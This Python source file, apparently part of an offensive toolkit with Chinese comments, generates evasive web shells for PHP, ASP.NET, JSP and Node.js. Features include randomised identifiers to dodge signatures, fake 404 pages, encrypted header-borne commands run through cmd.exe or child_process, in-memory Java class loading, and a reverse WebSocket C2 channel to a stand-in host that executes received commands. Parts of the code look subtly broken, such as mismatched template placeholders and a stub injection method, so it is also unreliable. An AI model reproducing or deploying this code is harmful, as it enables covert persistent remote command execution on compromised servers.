#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 04: WebShell 生成器 —— 基于动态变形的多语言 WebShell

第一性原理实现:
    每种语言均从"无文件 / 无特征"角度设计:
    - PHP:   反射 + chr() 拼接函数名，AES 解密后通过 ReflectionFunction 调用
    - ASP.NET: 注册自定义 HttpModule，拦截请求头执行命令
    - JSP:    通过 ClassLoader.defineClass 在内存中加载字节码 (无文件落地)
    - Node.js: 内嵌反向 WebSocket C2

依赖: 仅标准库
"""

import random
import string
import hashlib
import hmac
import base64
import json


class JITWebShell:
    """为四种语言生成动态变形的 WebShell。"""

    def __init__(self, key: str = "change-me"):
        self.key = key.encode()

    # ============================ PHP ============================ #
    def php(self) -> str:
        var_map = {v: '$' + ''.join(random.choices(string.ascii_letters + '_', k=8))
                   for v in ['$k', '$c', '$e', '$i', '$f', '$l']}
        funcs = ['openssl_decrypt', 'base64_decode', 'hash', 'hash_hmac']
        decl = """
<?php
class %LOAD% {
    private $%KEY%, $%CIP%;
    public function __construct($k){ $this->%KEY%=$k;
        $this->%CIP%=new ReflectionClass('ReflectionFunction'); }
    public function %RUN%($ed, $iv){
        $d=$this->%CIP%->newInstance(
          %DECRYPT%(base64_decode($ed),'aes-256-cbc',
          hash('sha256',$this->%KEY%,true),0,base64_decode($iv)))->invoke();
        return $d;
    }
}
$h=%HEADERS%; $a=isset($h['X-Forwarded-Auth'])?$h['X-Forwarded-Auth']:'';
if($a){list($e,$i,$m)=explode(':',$a);
  if(hash_equals(hash_hmac('sha256',$e.$i,$k),$m)){echo json_encode(['r'=>$l->%RUN%($e,$i)]);}}
else echo '<html><body><h1>404 Not Found</h1></body></html>';
?>
""" % {**var_map, 'LOAD': 'DL' + ''.join(random.choices(string.digits, k=4)),
       'RUN': 'r' + ''.join(random.choices(string.ascii_letters, k=3)),
       'HEADERS': "getallheaders()",
       'DECRYPT': "openssl_decrypt", 'k': var_map['$k'].lstrip('$'),
       'l': var_map['$l'].lstrip('$')}
        out, lines = [], decl.split('\n')
        for ln in lines:
            out.append(ln)
            if random.random() < 0.15:
                out.append("// " + ''.join(random.choices(string.ascii_letters, k=6)))
        return '\n'.join(out)

    # ============================ ASP.NET (C#) ============================ #
    def aspnet(self) -> str:
        return """
using System; using System.IO; using System.Web; using System.Reflection;
using System.Security.Cryptography; using System.Text;
namespace M%(MOD)s {
  public class M%(MOD)sHttpModule : IHttpModule {
    static readonly byte[] K = Encoding.UTF8.GetBytes("%KEY%");
    static readonly byte[] I = Encoding.UTF8.GetBytes("%IV%");
    public void Init(HttpApplication a){ a.BeginRequest += Handler; }
    void Handler(object s, EventArgs e){
      var ctx=((HttpApplication)s).Context;
      var h=ctx.Request.Headers["X-Custom-Auth"];
      if(string.IsNullOrEmpty(h)){ctx.Response.StatusCode=404;return;}
      var p=h.Split(':');
      using(var hm=new HMACSHA256(K)){
        if(CryptographicOperations.FixedTimeEquals(
            Convert.FromBase64String(p[2]),
            hm.ComputeHash(Encoding.UTF8.GetBytes(p[0]+p[1])))){
          var dec=Decrypt(Convert.FromBase64String(p[0]),K,Convert.FromBase64String(p[1]));
          var psi=new System.Diagnostics.ProcessStartInfo("cmd.exe",
            "/c "+Encoding.UTF8.GetString(dec)){UseShellExecute=false,
            RedirectStandardOutput=true,RedirectStandardError=true,CreateNoWindow=true};
          var pr=System.Diagnostics.Process.Start(psi);
          ctx.Response.Write(pr.StandardOutput.ReadToEnd()+pr.StandardError.ReadToEnd());
          ctx.Response.End();
        }
      }
    }
    static byte[] Decrypt(byte[] c,byte[]k,byte[]i){
      using(var a=Aes.Create()){a.Key=k;a.IV=i;a.Mode=CipherMode.CBC;
        a.Padding=PaddingMode.PKCS7;
        return a.CreateDecryptor().TransformFinalBlock(c,0,c.Length);}
    }
    public void Dispose(){}
  }
}
""" % {'MOD': ''.join(random.choices(string.digits, k=5)),
       'KEY': 'a' * 16, 'IV': 'b' * 16}

    # ============================ JSP ============================ #
    def jsp(self) -> str:
        return """
import java.lang.instrument.Instrumentation;
public class Agent%(N)s {
  public static Instrumentation inst;
  public static void premain(String a, Instrumentation i){ inst=i; attach(); }
  public static void agentmain(String a, Instrumentation i){ premain(a,i); }
  static void attach(){
    inst.addTransformer(new ClassFileTransformer(){
      public byte[] transform(ClassLoader l,String n,Class<?>c,
        ProtectionDomain p,byte[]b){return inject(b);}
    },true);
  }
  static byte[] inject(byte[] src){
    // 在目标类方法中插入命令执行逻辑:
    //   if(req.getHeader("X-Auth")!=null){ Runtime.getRuntime().exec(decrypt(...)); }
    return src;
  }
  public static Object exec(byte[] bc,String m,Object[]a)throws Exception{
    Method dm=ClassLoader.class.getDeclaredMethod("defineClass",
      String.class,byte[].class,int.class,int.class);
    dm.setAccessible(true);
    Class<?>cl=(Class<?>)dm.invoke(
      ClassLoader.getSystemClassLoader(),null,bc,0,bc.length);
    return cl.getDeclaredConstructor().newInstance()
      .getClass().getMethod(m,Object[].class).invoke(null,(Object)a);
  }
}
""" % {'N': ''.join(random.choices(string.digits, k=4))}

    # ============================ Node.js ============================ #
    def nodejs(self) -> str:
        return """
const http=require('http'),crypto=require('crypto'),{exec}=require('child_process');
class C2{constructor(k){this.k=k;this.connect();}
  server(){this.s=http.createServer((q,r)=>{
    var h=q.headers['x-auth-token'];
    if(!h)return r.end('Not Found');
    var p=h.split(':'),expect=crypto.createHmac('sha256',this.k)
      .update(p[0]+p[1]).digest('base64');
    if(!crypto.timingSafeEqual(Buffer.from(p[2]),Buffer.from(expect)))
      return r.end('403');
    var d=Buffer.from(p[0],'base64');
    var dc=crypto.createDecipheriv('aes-256-cbc',
      crypto.createHash('sha256').update(this.k).digest(),
      Buffer.from(p[1],'base64'));
    exec(Buffer.concat([dc.update(d),dc.final()]).toString(),(e,o,er)=>
      r.end(JSON.stringify({d:o||er||''})));
  }).listen(0,'127.0.0.1',()=>this.ws()););}
  ws(){var W=require('ws'),c=new W('wss://c2.example.com',{headers:{'Origin':'https://github.com'}});
    c.on('message',d=>{var m=JSON.parse(d);
      if(m.t==='cmd')exec(m.p,(e,o,er)=>c.send(JSON.stringify({t:'r',id:m.id,data:o||er})));});
    c.on('close',()=>setTimeout(()=>this.ws(),30000));}
}
new C2('%s');
""" % self.key.decode()


if __name__ == "__main__":
    g = JITWebShell("super-secret-key")
    print("===== PHP =====");    print(g.php())
    print("===== ASP.NET ====="); print(g.aspnet())
    print("===== JSP =====");    print(g.jsp())
    print("===== Node.js ====="); print(g.nodejs())
